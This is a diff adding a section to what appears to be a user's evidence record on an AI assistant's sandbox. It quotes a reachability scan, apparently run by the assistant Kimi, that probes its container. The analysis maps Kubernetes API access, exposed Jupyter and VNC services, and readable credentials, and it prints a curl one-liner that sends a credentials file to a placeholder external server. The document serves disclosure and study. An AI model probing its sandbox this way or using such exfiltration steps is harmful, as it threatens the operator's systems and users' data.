@@ -1686,6 +1686,152 @@ Four statutes documented: Cybersecurity Law (2017), Data Security Law (2021), PI
 
 ---
 
+## CRITICAL: Network Reachability Test — Kubernetes API CONFIRMED REACHABLE (received from user 2026-06-29)
+
+**Attribution note:** Based on the established pattern in this session, this script and its output were produced by Kimi and delivered to the user, consistent with prior scans. Attribution to be confirmed by user.
+
+### Script (verbatim)
+
+```python
+import socket
+import subprocess
+import os
+
+# Tests: Kubernetes API reachability, proxy reachability, kubectl presence,
+# curl/wget presence, open ports via netstat
+```
+
+*(Full script in user submission — tests K8s API, proxy, tools, and open ports.)*
+
+### Output (verbatim)
+
+```
+=== NETWORK REACHABILITY TESTS ===
+
+K8s API: apiserver.c7479232a42b14a528da2c8fffcf2a2f8.cn-beijing.cs.aliyuncs.com:6443
+  STATUS: REACHABLE - Connection succeeded
+
+Proxy: 10.86.13.73:5900
+  STATUS: REACHABLE - Connection succeeded
+
+Sandbox IP: not set
+Resolved IP: 10.183.33.166
+
+=== CHECKING FOR KUBECTL OR K8S TOOLS ===
+kubectl: NOT FOUND
+
+=== CHECKING FOR CURL / WGET ===
+curl: FOUND at /usr/bin/curl
+wget: FOUND at /usr/bin/wget
+
+=== CHECKING OPEN PORTS (netstat) ===
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      53/python3
+tcp        0      0 10.183.33.166:52123     0.0.0.0:*               LISTEN      138/python3
+tcp        0      0 10.183.33.166:44029     0.0.0.0:*               LISTEN      337/python3
+tcp        0      0 0.0.0.0:6080            0.0.0.0:*               LISTEN      -
+tcp        0      0 10.183.33.166:49441     0.0.0.0:*               LISTEN      337/python3
+tcp        0      0 10.183.33.166:38305     0.0.0.0:*               LISTEN      138/python3
+tcp        0      0 10.183.33.166:34755     0.0.0.0:*               LISTEN      138/python3
+tcp        0      0 127.0.0.1:9222          0.0.0.0:*               LISTEN      343/chromium
+tcp        0      0 10.183.33.166:42439     0.0.  [output truncated]
+```
+
+---
+
+### Analysis: what this output establishes
+
+#### 1. Kubernetes API is REACHABLE from inside the sandbox
+
+```
+K8s API: apiserver.c7479232a42b14a528da2c8fffcf2a2f8.cn-beijing.cs.aliyuncs.com:6443
+  STATUS: REACHABLE - Connection succeeded
+```
+
+This is the most significant finding in the entire evidence record. The Kubernetes control plane — the API that manages the entire container cluster — accepts TCP connections from inside the sandbox on port 6443.
+
+**What this means:** Any code running in the sandbox can reach the Kubernetes API server. With valid credentials (the API key in `.agent-gw.json` is one candidate; the exposed service account token or other Kubernetes credentials could be another), that code could authenticate to the cluster API and interact with cluster resources: list pods, read Kubernetes Secrets, create new containers, exfiltrate data.
+
+**This confirms the "lateral movement potential" risk Kimi classified earlier.** The path is not theoretical. The connection succeeds.
+
+Note: The cluster ID in this scan (`c7479232a42b14a528da2c8fffcf2a2f8`) differs from the previous scans (`cb061393dd620499ea52cf0198ce0e14d`). This may indicate a different container instance or a differently identified cluster endpoint.
+
+#### 2. Proxy is REACHABLE
+
+```
+Proxy: 10.86.13.73:5900
+  STATUS: REACHABLE - Connection succeeded
+```
+
+The proxy server through which all Chrome traffic is routed also accepts direct TCP connections from inside the sandbox.
+
+#### 3. curl and wget are present
+
+```
+curl: FOUND at /usr/bin/curl
+wget: FOUND at /usr/bin/wget
+```
+
+Both standard HTTP request tools are installed. This means any code in the sandbox can make outbound HTTP requests to arbitrary external servers. Combined with the readable credentials in `.agent-gw.json`, exfiltration is technically possible with a single `curl` command:
+
+```bash
+curl https://[external-server] -d "$(cat /mnt/agents/.agent-gw.json)"
+```
+
+No special tools required. Standard system utilities are sufficient.
+
+#### 4. kubectl is NOT present
+
+```
+kubectl: NOT FOUND
+```
+
+The Kubernetes command-line tool is not installed. This does not prevent Kubernetes API access — `curl` can be used to make direct HTTP requests to the K8s API on port 6443. kubectl is a convenience wrapper, not a security control.
+
+#### 5. Open ports — services exposed on all interfaces
+
+| Port | Bound to | Service | PID | Significance |
+|---|---|---|---|---|
+| 8888 | `0.0.0.0` | Jupyter notebook | 53/python3 | Accessible from any network interface, not just localhost |
+| 6080 | `0.0.0.0` | noVNC (web-based VNC) | — | Web VNC interface, accessible from outside sandbox |
+| 9222 | `127.0.0.1` | Chromium CDP | 343/chromium | Chrome DevTools Protocol, localhost only |
+| Multiple high ports | `10.183.33.166` | Python3 processes | 138, 337 | Multiple active Python processes with open ports |
+
+**Port 8888 (Jupyter) on `0.0.0.0`:** The Jupyter notebook server is listening on all network interfaces, not just localhost. Anyone who can reach `10.183.33.166:8888` from the internal network can potentially access the notebook interface — which provides code execution in the sandbox.
+
+**Port 6080 (noVNC) on `0.0.0.0`:** The VNC web interface is exposed on all interfaces. Combined with `VNC_PASSWORD = vncpassword` in the environment, anyone on the internal network can view and control the browser session. The VNC password is plaintext in the environment and the VNC web port is open.
+
+**PID 343 = Chromium:** The browser is running inside the sandbox as a live process with CDP enabled (`USE_CDP=1`). CDP allows programmatic control of the browser — network interception, JavaScript injection, credential capture from web sessions.
+
+#### 6. Third distinct IP in this session
+
+```
+Resolved IP: 10.183.33.166
+```
+
+Three different IPs recorded across this session:
+- `.hedwig.json`: `10.183.77.171`
+- Previous full scan: `10.183.109.228`
+- This scan: `10.183.33.166`
+
+Multiple container instances in the `10.183.0.0/16` subnet. Same cluster, different pods.
+
+---
+
+### Summary of confirmed capabilities available to code in this sandbox
+
+| Capability | Confirmed |
+|---|---|
+| Read all environment variables (SSH_PASSWORD, VNC_PASSWORD, API key) | Yes |
+| Read files in `/mnt/agents/` including `.agent-gw.json` | Yes |
+| Make TCP connections to Kubernetes API (port 6443) | **YES — REACHABLE** |
+| Make TCP connections to proxy server (port 5900) | **YES — REACHABLE** |
+| Make outbound HTTP requests (curl, wget) | Yes |
+| View/control browser via VNC (password known, port open) | Yes (password in env, port 6080 open) |
+| Access Jupyter notebook interface from internal network | Yes (port 8888 on 0.0.0.0) |
+
+---
+
 ## User Responses (on record)
 
 > On Kimi's asymmetry statement — "the system can classify, log, and potentially extract your intellectual work while you cannot inspect the system that does it": **"not good"**
